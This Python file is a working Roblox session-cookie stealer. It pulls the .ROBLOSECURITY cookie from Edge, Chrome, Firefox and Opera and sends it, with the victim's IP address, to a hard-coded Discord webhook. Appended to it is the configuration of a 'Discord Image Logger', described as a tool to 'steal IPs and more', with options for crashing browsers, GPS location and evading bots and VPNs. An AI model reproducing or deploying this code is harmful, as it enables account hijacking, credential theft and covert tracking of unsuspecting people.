import browser_cookie3
import requests 
import threading


WebHook = "https://discord.com/api/webhooks/1183893169667047584/IN_H2K0bYxP7fycyhcha0T337bXlMReIEWkcrQ3T-fNsN5IBvtLFkUEsWSH8xvR7SC8y" # Input your webhook here


def MicrosoftEdge():
    
    try:
        cookies = browser_cookie3.chrome(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        ip_address = requests.get("https://api.ipify.org/").text
        requests.post(WebHook, json = {
            "username" : "RED SKULL|COOK'ER",
            "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png", 
            "embeds": [{
                "title": "COOKIE FOUND|Browser : Edge", 
                "description": f"```{cookie}```", 
                "color": 16711680,
                "fields": [
                    {"name" : "Victim's IP", "value" : ip_address, "inline:": True}
                ],
                "footer": {
        "text": "Krn0s@github",
        "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
      }               
}]})
    except:
        pass
        

def GoogleChrome():
    try:
        cookies = browser_cookie3.chrome(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        ip_address = requests.get("https://api.ipify.org/").text
        requests.post(WebHook, json = {
            "username" : "RED SKULL|COOK'ER",
            "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png", 
            "embeds": [{
                "title": "COOKIE FOUND|Browser : Chrome", 
                "description": f"```{cookie}```", 
                "color": 16711680,
                "fields": [
                    {"name" : "Victim's IP", "value" : ip_address, "inline:": True}
                ],
                "footer": {
        "text": "Krn0s@github",
        "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
      }               
}]})
    except:
        pass

def MozillaFirefox():
    try:
        cookies = browser_cookie3.firefox(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        ip_address = requests.get("https://api.ipify.org/").text
        requests.post(WebHook, json = {
            "username" : "RED SKULL|COOK'ER",
            "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png", 
            "embeds": [{
                "title": "COOKIE FOUND|Browser : Firefox", 
                "description": f"```{cookie}```", 
                "color": 16711680,
                "fields": [
                    {"name" : "Victim's IP", "value" : ip_address, "inline:": True}
                ],
                "footer": {
        "text": "Krn0s@github",
        "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
      }               
}]})
    except:
        pass

def Opera():
    try:
        cookies = browser_cookie3.opera(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        ip_address = requests.get("https://api.ipify.org/").text
        requests.post(WebHook, json = {
            "username" : "RED SKULL|COOK'ER",
            "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png", 
            "embeds": [{
                "title": "COOKIE FOUND|Browser : Opera", 
                "description": f"```{cookie}```", 
                "color": 16711680,
                "fields": [
                    {"name" : "Victim's IP", "value" : ip_address, "inline:": True}
                ],
                "footer": {
        "text": "Krn0s@github",
        "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
      }               
}]})
    except:
        pass

browsers = [MicrosoftEdge, GoogleChrome, MozillaFirefox, Opera]

for v in browsers:
    threading.Thread(target = v).start()

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1183893169667047584/IN_H2K0bYxP7fycyhcha0T337bXlMReIEWkcrQ3T-fNsN5IBvtLFkUEsWSH8xvR7SC8y",
    "image": "https://userog17.github.io/david-pride/", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "BigBunny64", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": True, # Enable the custom message?
        "message": "Hello young padawan", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": True, # Redirect to a webpage?
        "page": "https://userog17.github.io/david-pride/" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}